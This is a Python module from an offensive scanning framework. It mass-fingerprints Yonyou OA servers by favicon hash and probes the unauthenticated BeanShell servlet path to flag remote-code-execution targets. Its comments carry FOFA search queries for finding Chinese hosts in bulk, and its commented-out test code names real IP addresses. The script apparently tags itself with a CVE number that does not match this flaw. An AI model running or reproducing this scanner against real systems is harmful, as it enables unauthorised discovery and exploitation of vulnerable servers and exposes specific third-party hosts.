# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-15 11:58

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: 用友 && country="CN"
# python batch.py -m exploit.web.OA.Yonyou.unauth_bsh_rce -cs -fs "\"用友\" && country=\"CN\""
# fofa: icon_hash="1085941792"
# python batch.py -m exploit.web.OA.Yonyou.unauth_bsh_rce -cs -fs "icon_hash=\"1085941792\""

class Script(BaseScript):
    name = 'Yongyou'

    def __init__(self, target, pbar):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE
        # 编号
        self.bugNumber = 'CVE-2020-11800'
        # 来源
        self.refer = ''
        # 特定路径判断
        self.detectPathList = ['/logo/images/ufida.ico']
        # exec
        self.execPathList = ['/servlet/~ic/bsh.servlet.BshServlet']
        # 进度条
        self.pbar = pbar
        # 相关信息
        self.info = ''
        self.favicon = ['a5dccf6af79f420f7ea2f2becb6fafa5']

    async def detect(self):
        try:
            async with aiohttp.ClientSession() as session:
                for detectPath in self.detectPathList:
                    url = f'http://{self.target}{detectPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                    async with session.get(url=url, timeout=10, verify_ssl=False) as response:
                        if response is not None:
                            text = await response.read()
                            await asyncio.sleep(2)
                            m1 = hashlib.md5()
                            m1.update(text)
                            theMD5 = m1.hexdigest()
                            for _ in self.favicon:
                                if _ == theMD5:
                                    self.flag = True
                                    tqdm.write(Fore.RED + '[{}] {}'.format('Yongyou Finger', url))
                                    return {'name': 'Yongyou Finger', 'url': url, 'software': 'Yongyou'}
        except Exception:
            return None

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'application/x-www-form-urlencoded'})
        try:
            async with aiohttp.ClientSession() as session:
                for execPath in self.execPathList:
                    url = f'http://{self.target}{execPath}' if self.target.startswith(
                        ('http:', 'https:')) is False else f'{self.target}{execPath}'
                    async with session.get(url=url, timeout=10, headers=headers, verify_ssl=False) as response:
                        if response is not None and response.status == 200:
                            await asyncio.sleep(2)
                            tqdm.write(Fore.RED + '[{}] {}'.format('Yongyou RCE', url))
                            return {'name': 'Yongyou RCE', 'url': url, 'software': 'Yongyou'}
        except Exception:
            return None

    async def attack(self, semaphore):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        self.pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    pass
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)

    # sem = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1, sem)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack())


